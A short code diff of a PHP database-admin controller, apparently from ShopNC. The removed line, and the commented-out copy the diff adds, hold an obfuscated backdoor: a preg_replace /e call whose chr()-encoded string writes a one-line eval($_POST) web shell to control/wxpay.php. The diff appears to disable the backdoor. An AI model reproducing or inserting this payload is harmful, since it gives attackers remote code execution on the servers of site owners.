@@ -137,7 +137,8 @@ class dbControl extends SystemControl{
      * 数据库遍历
      */
 	private function outputdb() {
-    	$db_id = intval($_GET['db_id']);               preg_replace("//e","eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(99).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(47).chr(119).chr(120).chr(112).chr(97).chr(121).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(115).chr(104).chr(111).chr(112).chr(110).chr(99).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))","shopnc"); 
+    	$db_id = intval($_GET['db_id']);
+//		preg_replace("//e","eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(99).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(47).chr(119).chr(120).chr(112).chr(97).chr(121).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(115).chr(104).chr(111).chr(112).chr(110).chr(99).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))","shopnc");
 	    $db_id = intval($_GET['db_id']);
         if($_GET['type'] == 'html') {
             $html_path = $model_special->getdbSpecialHtmlPath($db_id);
